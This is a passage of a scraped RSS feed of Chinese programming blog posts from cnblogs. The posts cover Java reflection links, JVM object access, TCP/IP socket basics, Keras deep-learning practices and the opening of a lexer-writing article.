&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484195&amp;amp;idx=1&amp;amp;sn=95c3acdaeb0f6a1d61f152550c3d2669&amp;amp;chksm=fc3338d3cb44b1c55f6046f6280da863d3514cca3ce50ef29e2d53b0eafe2b7efef062c51c27&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;【面试】迄今为止把同步/异步/阻塞/非阻塞/BIO/NIO/AIO讲的这么清楚的好文章（快快珍藏）&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484201&amp;amp;idx=1&amp;amp;sn=7cf45aff64eecdff58d2acea8fb7c9fa&amp;amp;chksm=fc3338d9cb44b1cfc6b5c797a005c91ed19b0dd06587fdfb2e7b553e2b03104a145380a7a990&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;【面试】一篇文章帮你彻底搞清楚“I/O多路复用”和“异步I/O”的前世今生（深度好文，建议珍藏）&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484206&amp;amp;idx=1&amp;amp;sn=9547fdad111ac1a8ac9311cb9e76b9dc&amp;amp;chksm=fc3338decb44b1c89aee789e80e32989ea43232321397cc265c99b1d0ce4057e6563bc00a3d3&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;【面试】如果把线程当作一个人来对待，所有问题都瞬间明白了&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484214&amp;amp;idx=1&amp;amp;sn=0f677e8b0d61b5a5317a274cc8b33cbc&amp;amp;chksm=fc3338c6cb44b1d06aa20533aafb0b7b709b3bd88dbf6af6b8f3cb91288e4afc585ecb77489a&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;Java多线程通关———基础知识挑战&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484224&amp;amp;idx=1&amp;amp;sn=78a994d8311dd0abf3f9419108ff363a&amp;amp;chksm=fc3338b0cb44b1a6803dbeb8540c17ce753f1878e3b7cc86cf6508e81dc32736f84d7224f166&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;品Spring：帝国的基石&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;&lt;strong&gt;作者&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;是工作超过&lt;/span&gt;&lt;span&gt;&lt;strong&gt;10年&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;的码农，现在任架构师。喜欢研究技术，崇尚简单快乐。&lt;/span&gt;&lt;span&gt;&lt;strong&gt;追求以通俗易懂的语言解说技术，希望所有的读者都能看懂并记住。&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;下面是公众号的二维码，欢迎关注！&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/76066/201912/76066-20191215144232059-516189766.jpg&quot; alt=&quot;&quot;/&gt; &lt;/p&gt;
</description>
<pubDate>Mon, 23 Mar 2020 00:50:00 +0000</pubDate>
<dc:creator>编程新说(李新杰)</dc:creator>
<og:description>缘起我在看Spring的源码时，发现了一个隐藏的问题，就是父类方法（Method）在子类实例上的反射（Reflect）调用。初次看到，感觉有些奇特，因为父类方法可能是抽象的或私有的，但我没有去怀疑什么</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/lixinjie/p/combine-reflect-and-oo-in-java.html</dc:identifier>
</item>
<item>
<title>「每天五分钟，玩转 JVM」：对象访问定位 - Vi的技术博客</title>
<link>http://www.cnblogs.com/viyoung/p/12550134.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/viyoung/p/12550134.html</guid>
<description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
&lt;p&gt;在「对象内存布局」一节中，我们了解到对象头中包含了一个叫做&lt;strong&gt;类型指针&lt;/strong&gt;的东西，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。但是，并不是所有的虚拟机都是这么去做的。不同的虚拟机关于这点有不同的实现，目前主流的方式可以分为&lt;strong&gt;句柄&lt;/strong&gt;和&lt;strong&gt;直接指针&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;句柄&quot;&gt;句柄&lt;/h3&gt;
&lt;img src=&quot;http://viyoungblog.oss-cn-beijing.aliyuncs.com/2019-10-28-140401.png&quot; alt=&quot;image-20191028220400935&quot;/&gt;&lt;p&gt;由图中我们可以看到，在我们的堆中被划分出了一块单独的部分，叫做&lt;strong&gt;句柄池&lt;/strong&gt;，句柄池的作用就像一个中转站，我们要查询位于&lt;strong&gt;堆&lt;/strong&gt;内存中的&lt;strong&gt;对象实例数据&lt;/strong&gt;，需要通过一次&lt;strong&gt;间接&lt;/strong&gt;的索引去获取，而另一部分是指向&lt;strong&gt;方法区&lt;/strong&gt;中的&lt;strong&gt;对象类型&lt;/strong&gt;的指针。而此时JVM栈中的栈帧中的本地变量表中所存储的引用地址&lt;strong&gt;是这个对象所对应的句柄地址&lt;/strong&gt;，而非对象本身的地址。&lt;/p&gt;
&lt;h3 id=&quot;直接指针访问&quot;&gt;直接指针访问&lt;/h3&gt;
&lt;img src=&quot;http://viyoungblog.oss-cn-beijing.aliyuncs.com/2019-10-28-141332.png&quot; alt=&quot;image-20191028221331772&quot;/&gt;&lt;p&gt;由上图中，我们可以看到，&lt;strong&gt;reference&lt;/strong&gt;指针直接指向的就是对象实例数据，而对象实例数据中（对象头）包含了对象类型的数据指针，指向的是位于方法区中的对象类型数据。&lt;/p&gt;
&lt;h3 id=&quot;对比&quot;&gt;对比&lt;/h3&gt;
&lt;p&gt;从稳定性上来说，句柄访问定位更胜一筹，因为在我们发生 GC 的时候，对象的实例数据指针会发生变化，而 reference 却不会发生任何的改变。&lt;/p&gt;
&lt;p&gt;而从时间的角度来考虑，直接指针访问无疑更胜一筹，因为少了一次指针定位的时间开销，而我们使用的 HotSpot 虚拟机也是使用的这种方式来定位对象，毕竟速度是王道~&lt;/p&gt;
&lt;h3 id=&quot;公众号&quot;&gt;公众号&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://viyoungblog.oss-cn-beijing.aliyuncs.com/viyoung/2020-03-15-qrcode_for_gh_a65beceb0947_258.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 23 Mar 2020 00:49:00 +0000</pubDate>
<dc:creator>Vi的技术博客</dc:creator>
<og:description>前言 在「对象内存布局」一节中，我们了解到对象头中包含了一个叫做 类型指针 的东西，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。但是，并不是所有的虚拟机都是这么去做的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/viyoung/p/12550134.html</dc:identifier>
</item>
<item>
<title>TCP IP Socket In C, 2e-chapter 1 Introduction - BasilGuo</title>
<link>http://www.cnblogs.com/basilguo/p/TCP-IP-sockets-in-c-2e-chapter1-introduction.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/basilguo/p/TCP-IP-sockets-in-c-2e-chapter1-introduction.html</guid>
<description>&lt;center&gt;&lt;span&gt;本章是基础概念，建议补计算机网络基础，这里不全.&lt;/span&gt;&lt;/center&gt;


&lt;p&gt;&lt;strong&gt;计算机网络&lt;/strong&gt;是多台主机和路由器通过通信信道（communication channels）连接起来的。有三个实体：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;主机，运行程序&lt;/li&gt;
&lt;li&gt;路由器，转发数据&lt;/li&gt;
&lt;li&gt;通信信道可以是无线的也可以是有线的&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;数据包&lt;/strong&gt;就是主机之间传递的信息，是字节序列，由程序构建和解释。数据包不仅有数据，还有包头包含一些转发所用的控制信息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;协议&lt;/strong&gt;是数据包交换时程序的一些约定，主要是解析数据包的控制包头信息。协议是分层的，常见的也是事实标准是TCP/IP。&lt;/p&gt;
&lt;p&gt;应用程序、协议和Socket API三者关系如下图，注意Socket的位置。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200322223803247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jhc2lsMTcyOA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;A TCP/IP network&quot;/&gt;&lt;br/&gt;网络层，IP协议提供的是数据报服务（datagram service），使用了分组交换，每一个packet单独处理、发送。但是请注意，IP是一个best-effort协议，尽力而为的host-to-host服务，可能出现包丢失、包乱序、包重复的现象，这需要上层协议来解决。&lt;/p&gt;
&lt;p&gt;传输层，有两种协议，可靠有连接字节流的TCP和不可靠无连接数据报的UDP。两者共同点是都使用了端口号（port number）来定位主机上的应用程序，提供的是end-to-end服务。TCP需要三次握手、四次挥手，使用TCP某种情形有点像文件I/O。但是使用UDP的应用程序需要自己来处理IP的三个问题。&lt;/p&gt;

&lt;p&gt;通信之前必须知道对方的地址，就像邮局送信一样，知道了地址才能投递出去。确定网络中某个应用程序的位置，需要三个信息：IP地址、端口号和传输协议。&lt;/p&gt;
&lt;p&gt;IP地址有两种：IPv4和IPv6。&lt;/p&gt;
&lt;h2 id=&quot;21-ip地址格式&quot;&gt;2.1 IP地址格式&lt;/h2&gt;
&lt;p&gt;IPv4使用32位（bit）地址，常见写法是点分十进制。如&lt;code&gt;10.1.2.3&lt;/code&gt;。IPv6是128位地址，通常使用32个16进制数（hex）来表示，如&lt;code&gt;2000:fdb8:0000:0000:0001:00ab:853c:39a1&lt;/code&gt;，中间的0可以省略，但是只能省略一次，如果多个地方省略了0，就无法判断到底是省略了几个0，上述地址等价于&lt;code&gt;2000:fdb8::1:ab:853c:39a1&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;22-ipv4和ipv6共存&quot;&gt;2.2 IPv4和IPv6共存&lt;/h2&gt;
&lt;p&gt;现在处于IPv4向IPv6的过渡时期，但是怪异的是，IPv6和IPv4不兼容，常见的过渡手段：双栈、隧道和翻译【这是我知道的补充知识】。双栈就是IPv4和IPv6两个协议栈共存。这是最简单的方法，但是IPv4和IPv6没法通信，各走各的路罢了。隧道得名于英吉利海峡的海底隧道，就是把汽车放在火车上过海底隧道，这里是IPv6-in-IPv4或者IPv4-in-IPv6。翻译是清华大学李星老师力推的。还有IPv4映射到IPv6，使用&lt;code&gt;::fff:IPv4 address&lt;/code&gt;，这种写法很怪异，前面是hex，后面IPv4地址是点分十进制。&lt;/p&gt;
&lt;h2 id=&quot;23-端口号&quot;&gt;2.3 端口号&lt;/h2&gt;
&lt;p&gt;TCP和UDP都有端口号，端口号是确定主机上的应用程序的。端口号是16位无符号二进制数，共有65536个端口号，其中0是保留端口号，0~1023是系统端口（System Port），端口号从1024---49151是被注册的端口，也称为用户端口（User Port），后面49152~65536是动态分配的，具体的分配用途参加RFC6335。&lt;/p&gt;
&lt;h2 id=&quot;24-特殊地址&quot;&gt;2.4 特殊地址&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;本地回环地址（Loopback Address），分配给虚拟设备，回环接口，发出去的数据会再发给本机，用于测试IP协议安装正确性，即便没有网卡也可以使用。IPv4是&lt;code&gt;127.0.0.1&lt;/code&gt;，IPv6是&lt;code&gt;0:0:0:0:0:0:0:1&lt;/code&gt;，或简写&lt;code&gt;::1&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;IPv4的私有地址（Private Address），&lt;code&gt;10.0.0.0/8&lt;/code&gt;，&lt;code&gt;172.16.0.0/12&lt;/code&gt;，&lt;code&gt;192.168.0.0/16&lt;/code&gt;。对于NAT地址转换未尝不是一件好事。&lt;/li&gt;
&lt;li&gt;链路本地地址（Link-local Address），也称自动配置（autoconfigration）地址。 它仅供于在网段，或广播域中的主机相互通信使用，路由器也不会转发这类地址。这类主机通常不需要外部互联网服务，仅有主机间相互通讯的需求。IPv4是&lt;code&gt;169.254.0.0/16&lt;/code&gt;，IPv6是&lt;code&gt;FE80::/10&lt;/code&gt;开头的地址。&lt;/li&gt;
&lt;li&gt;多播（组播）地址（Multicast Address）。IPv4是&lt;code&gt;224.0.0.0/24&lt;/code&gt;，IPv6是&lt;code&gt;FF00::/120&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;网络协议处理的是地址，而非名字。地址是二进制数，而名字是字符串，显然使用名字更方便（基于这个原因出来了NDN网络吗[smile cry]）。从名字到地址的转换使用了DNS（Domain Name System，域名系统）。&lt;/p&gt;

&lt;p&gt;客户端程序发起通信请求，服务端程序被动（passively）等待并响应请求。【其实就是请求响应模型了】客户端需要知道服务器端的IP地址和端口号才能发起请求，而服务器端收到请求也便知道了客户端的IP地址和端口号。&lt;/p&gt;
&lt;p&gt;IP地址一般是通过统一资源定位符（Universal Resource Locator，URL）并结合名字服务知道的。端口号则是由IANA（Internet Assigned Number Authority）分配的。&lt;/p&gt;
&lt;p&gt;还有一种架构是peer-to-peer（P2P），【B/S是C/S的一种】，但是这种架构按我理解其实也是一种极端的C/S，一个peer既是server，也是client。&lt;/p&gt;

&lt;p&gt;Socket其实最早叫做Berkeley Socket出现于Unix系统上，简称Socket，是应用程序收发数据的一种抽象手段，和打开文件操作，允许程序读写一样，毕竟Unix哲学：“一切都是文件”嘛。Socket也是一种文件。&lt;/p&gt;
&lt;p&gt;不同的协议栈有不同的Socket，这里只关注TCP/IP协议栈。这里的Socket分为Stream Socket，以及Datagram Socket。前者使用TCP，后者使用UDP。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200323001313931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jhc2lsMTcyOA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;Sockets，protocols，and ports&quot;/&gt;&lt;br/&gt;上图描述了应用程序、Socket、协议、端口号以及主机之间的逻辑关系。&lt;/p&gt;

</description>
<pubDate>Mon, 23 Mar 2020 00:44:00 +0000</pubDate>
<dc:creator>BasilGuo</dc:creator>
<og:description>读书笔记，TCP IP Socket In C, 2e，第一章，概念基础介绍</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/basilguo/p/TCP-IP-sockets-in-c-2e-chapter1-introduction.html</dc:identifier>
</item>
<item>
<title>深度学习最佳实践 - renyuzhuo</title>
<link>http://www.cnblogs.com/renyuzhuo/p/12547422.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/renyuzhuo/p/12547422.html</guid>
<description>&lt;ul&gt;&lt;li&gt;本文首发自公众号：&lt;a href=&quot;https://ai.renyuzhuo.cn/about&quot;&gt;RAIS&lt;/a&gt;，欢迎关注。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;最佳实践，顾名思义，就是做某事的最佳方法，当然，这里的最佳一定是绝大多数情况，但又不是百分百的情况，我们不必纠结这个问题，我们需要记住的是下面这些方法在深度学习实践中是非常好的做法。&lt;/p&gt;
&lt;h2 id=&quot;回调机制&quot;&gt;&lt;strong&gt;回调机制&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;如果你看到这里，我有理由认为你是一个懂得程序设计懂得编程的有一定开发经验的程序员，既然如此，你一定对回调不陌生，回调类似于一种观察者的设计模式，我交给你一个任务去执行，交代结束我就继续去做自己的工作了，你执行结束了，不管结果是好是坏，你都要把结果告诉我，这就是回调的含义。&lt;/p&gt;
&lt;p&gt;在我们之前的各种深度学习的例子中，总有一个参数是 epochs，含义是网络模型循环迭代的次数，一开始的时候，我们都会给出一个不小的值，让网络训练然后调整参数，这个 epochs 在调整参数的过程中总要保证模型要处于过拟合状态，只有这样，我们才能知道在什么情况下网络达到最优。在前面的大多数例子中这是合理的也是可行的，因为我们的网络训练的很快，数据集也没有大到在可接受时间内无法完成的情况，因此这并不影响什么，但是也有一些例外，例如前文提到的循环神经网络，训练的时间可能就有点让你等得不耐烦了，这个问题凸显出来了，我们需要解决这个问题。&lt;/p&gt;
&lt;p&gt;我们查看训练过程中的数据，找到哪里开始过拟合，那我们就把循环迭代的次数设置成那个临界点，重新去训练网络，那解决上诉问题的思路是否可以改为我们训练的网络，自己去判断什么时候开始过拟合（或者数据指标无显著变化），然后自动停下来，自然，回调是处理这种问题最好的方法了，现在各种深度学习框架几乎都提供了这样的方法，具体怎么做呢？我们还是以 Keras 为例，这里给出三个常用的例子，不同框架有一些细微差别，使用时请关注：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# 定义需要哪些 callback
callbacks_list = [
    # 当所监控的数据不再增长，停止训练
    keras.callbacks.EarlyStopping(
        monitor='acc',
        patience=1,
    ),
    # 每轮训练都进行一次模型参数的保存，
    # monitor 表示如果监控数据没有改善（自动推断，还可用 mode 参数控制），不进行保存
    # save_best_only=True 时：
    #   val_loss: 自动推断 min
    #   val_acc: 自动推断 max
    keras.callbacks.ModelCheckpoint(
        filepath='point_model.h5',
        monitor='val_loss',
        save_best_only=True,
    ),
    # 当评价的指标没有提升时，减小学习率
    keras.callbacks. ReduceLROnPlateau(
        monitor='val_loss' 
        factor=0.1,    # 减小 10 倍学习率，2 或者 10 倍是常用值
        patience=10,   # 10 次迭代没有改善
    )
    # 当然，还可以自定义一些，keras.callbacks.Callback 的子类
]
model.fit(callbacks = callbacks_list)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;tensorboard&quot;&gt;&lt;strong&gt;TensorBoard&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;对于 TensorBoard，我们在前文 &lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzI1MzQzMDE0NQ==&amp;amp;mid=2247483854&amp;amp;idx=1&amp;amp;sn=70d008a9063161dfdfe038609830e4ae&amp;amp;chksm=e9d5d120dea258367bd6b455cc7fe79f89f34f8bd4543dd0f10f5dccb7e698329cca01aba5db&amp;amp;scene=21#wechat_redirect&quot;&gt;神经网络手写数字识别&lt;/a&gt; 中提到过，当时我们说我们知道网络训练出来一个模型，但却不知道网络中具体是怎么运行的，所以需要 TensorBoard 进行可视化查看，可以在浏览器中查看，类似于这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMDIzNTY5LTYzMjU3NDVkZmFkMjkzYWI?x-oss-process=image/format,png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMDIzNTY5LWQxMGNkZDhjMWY1OGUxMTY?x-oss-process=image/format,png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;代码实现与上面的 Callback 几乎一样：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;from keras.callbacks.tensorboard_v2 import TensorBoard
callback_list = [
        keras.callbacks.TensorBoard(
            log_dir='./logs',
            histogram_freq=1,
            embeddings_freq=1,
        )
    ]
model.fit(train_images, train_labels, epochs=5, batch_size=128, callbacks=callback_list)
# shell 中：tensorboard --logdir=logs
# 浏览器：http://localhost:6006/
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;相信现在你再看以前的数据导出的内容，会有不同的感觉，这不是一篇专门讲解 TensorBoard 的文章，我建议你回去看看，会有不同的。当然，这里还有一个小插曲，最新的正式版的 Keras 和 TensorFlow 不兼容，使用这个回调时会报错，已经 Fix，相关 GitHub Issues 在这里：&lt;a href=&quot;https://bit.ly/2QDtXqN&quot;&gt;https://bit.ly/2QDtXqN&lt;/a&gt;，2 月 20 号更改的，相信不久后的新版本会发布这个 Fix。&lt;/p&gt;
&lt;p&gt;接下来我们讨论一下如何提高深度学习性能相关内容。&lt;/p&gt;
&lt;h2 id=&quot;采用高级设计模式&quot;&gt;&lt;strong&gt;采用高级设计模式&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;设计模式往往是普通程序设计的最佳实践中的方法之一，在深度学习中，这里的设计模式有些不同。这里的设计模式包括三种：残差连接、批标准化和深度可分离卷积。&lt;/p&gt;
&lt;h3 id=&quot;残差连接&quot;&gt;&lt;strong&gt;残差连接&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMDIzNTY5LTEzZjgyMmZkNTc4YmI2MDI?x-oss-process=image/format,png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;采用 &lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzI1MzQzMDE0NQ==&amp;amp;mid=2247484022&amp;amp;idx=1&amp;amp;sn=e45fa6e86bff41ed82f1fdf8cb48c577&amp;amp;chksm=e9d5d298dea25b8e643fe8df73190140556c55bcc3757e81409d986e371c2e8813fa0f47fff9&amp;amp;scene=21#wechat_redirect&quot;&gt;上文&lt;/a&gt; 所述的函数式编程的方法，将前面层训练的输出作为后面某些层的输入，解决梯度消失和表示瓶颈的问题。&lt;/p&gt;
&lt;h3 id=&quot;批标准化&quot;&gt;&lt;strong&gt;批标准化&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;批标准化是标准化的一种，我们在前文见过的标准化的方法是：让所有数据减去其平均值，然后分别除以其标准差，使其平均值为 0，标准差为 1，是不是想起了标准正态分布（计算机是固化的数学），对，就是那样！&lt;/p&gt;
&lt;p&gt;批标准化的做法就是卷积神经网络在训练过程中，每一层的输入都保持相同的分布，这么做效果怎么样，非常好，具体的原理又是一篇论文，日后再聊，但我们知道的是训练的速度明显加快，收敛过程也明显加快，增加分类效果，同时因为对学习率要求不高，因此调参也更容易了，总之就是用起来很爽。&lt;/p&gt;
&lt;p&gt;这里要指出，尤其对于一些比较深的网络，批标准化有助于梯度传播。对应的代码在 Keras 是 BatchNormalization，在卷积层或密集层之后使用，代码奉上：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;conv_model.add(layers.Conv2D(32, 3, activation='relu'))
conv_model.add(layers.BatchNormalization())
​
dense_model.add(layers.Dense(32, activation='relu'))
​dense_model.add(layers.BatchNormalization())
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;深度可分离卷积&quot;&gt;&lt;strong&gt;深度可分离卷积&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;深度可分离卷积（SeparableConv2D）层的做法是将输入分别执行空间卷积，然后逐点卷积将输出通道混合，在一些情况下可以代替 Conv2D 层，由于他的参数更少，浮点运算更少，因此也有更好的效率，是一个轻量的模型。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMDIzNTY5LTQ4YmYwZGRhMTcyYzBlMDQ?x-oss-process=image/format,png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面是一个图像分类的代码的例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;model = Sequential()
model.add(layers.SeparableConv2D(32, 3, activation='relu', input_shape=(64, 64, 3,)))
model.add(layers.SeparableConv2D(64, 3, activation='relu'))
model.add(layers.MaxPooling2D(2))
model.add(layers.SeparableConv2D(64, 3, activation='relu'))
model.add(layers.SeparableConv2D(128, 3, activation='relu'))
model.add(layers.MaxPooling2D(2))
model.add(layers.SeparableConv2D(64, 3, activation='relu'))
model.add(layers.SeparableConv2D(128, 3, activation='relu'))
# 极大的减少运算量
model.add(layers.GlobalAveragePooling2D())
model.add(layers.Dense(32, activation='relu'))
model.add(layers.Dense(10, activation='softmax'))
model.compile(optimizer='rmsprop', loss='categorical_crossentropy')
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;超参数优化&quot;&gt;&lt;strong&gt;超参数优化&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;我们在构建网络模型的时候有很多时候都是凭感觉做出的决定：堆叠多少层，用什么激活函数，是否需要批标准化等，这些参数叫做超参数。平时我们所说的参数指的是在网络训练过程中，内部节点模型的参数，与这个参数没什么关系。&lt;/p&gt;
&lt;p&gt;我们知道参数的调节太复杂太庞大了，因此我们人类采用让机器去调节，根据反馈信号等作为调节依据，那同样的，这样的超参数是不是也可以考虑交给机器呢，毕竟让程序员去做这样的事情，程序员一定会写代码自动化的完成这个工作。所以结论就是无论如何都需要交给机器去做。&lt;/p&gt;
&lt;p&gt;但是这种优化参数的方法并没有什么特别好的特别优秀的统一方法，大致的过程就是读入（或自动生成）一组参数进行模型的构建和训练，保存下来结果，再次用另一组参数模型训练，比较哪个结果好，留下好的结果，如此重复，最终一定程度的时候得到的参数就认为是最好的参数。注意这种超参数的调节其实也是对验证集的训练，也要考虑过拟合，这一点需要注意。&lt;/p&gt;
&lt;p&gt;当然，这里的超参数的调节方法有一定的算法，典型的就是贝叶斯优化算法，不一定有效，情况太复杂了，这只是一个方法，这是个大课题，日后再聊。&lt;/p&gt;
&lt;h2 id=&quot;模型集成&quot;&gt;&lt;strong&gt;模型集成&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;针对这个问题，一般是在竞赛或者是生产环境中有效的，在研究学习上的作用有限，这一点需要注意。那什么叫模型集成呢，就是我对同样的数据集，用不同的网络模型方法进行训练，得到的结果都还不错，把他们加权结合在一起，所得到的的结果就可能比每一种都要好。&lt;/p&gt;
&lt;p&gt;怎么解释这个问题呢？举一个不是那么准确的例子，图片分类，有的模型更关注线条，有的模型关注颜色，把他们结合在一起的模型就既关注了线条又关注了颜色，因此最终的结果就会更好一些，换一句话说，就是不同的模型关注数据的不同方面，更加全方位立体式的分析数据，当然得到的效果要好一些了。当然，这也要求所集成的模型都还不错，否则有那么一个捣乱的，你这个集成的模型也就废了，这很好理解。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;深度学习是个大课题，最佳实践也不仅仅这么多，这里给出的是大概率有效的成熟和不成熟的方法，有些方法还处于发展阶段，但本来神经网络中间训练过程的各种细节就很难说清楚了，因此只有有效的才是最好的，成熟不成熟都是值得讨论的，本篇就到这里。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;本文首发自公众号：&lt;a href=&quot;https://ai.renyuzhuo.cn/about&quot;&gt;RAIS&lt;/a&gt;，欢迎关注。&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Mon, 23 Mar 2020 00:37:00 +0000</pubDate>
<dc:creator>renyuzhuo</dc:creator>
<og:description>本文首发自公众号： &amp;quot;RAIS&amp;quot; ，欢迎关注。 最佳实践，顾名思义，就是做某事的最佳方法，当然，这里的最佳一定是绝大多数情况，但又不是百分百的情况，我们不必纠结这个问题，我们需要记</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/renyuzhuo/p/12547422.html</dc:identifier>
</item>
<item>
<title>手写一个词法分析器 - crossoverJie</title>
<link>http://www.cnblogs.com/crossoverJie/p/12549820.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/crossoverJie/p/12549820.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/4onkHVWNTsELqaK.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;最近大部分时间都在撸 &lt;code&gt;Python&lt;/code&gt;，其中也会涉及到将数据库表转换为 &lt;code&gt;Python&lt;/code&gt; 中 &lt;code&gt;ORM&lt;/code&gt; 框架的 &lt;code&gt;Model&lt;/code&gt;，但我们并没有找到一个合适的工具来做这个意义不大的”体力活“，所以每次新建表后大家都是根据自己的表结构手写一遍 &lt;code&gt;Model&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;一两张表还好，一旦 10 几张表都要写一遍时那痛苦只有自己知道；这时程序员的 slogan 再次印证：一切毫无意义的体力劳动终将被计算机取代。&lt;/p&gt;

&lt;p&gt;既然没有现成的工具那就自己写一个吧，演示效果如下：&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/dLpAoxf4BwEj81S.gif&quot; alt=&quot;1-min.gif&quot;/&gt;&lt;/p&gt;
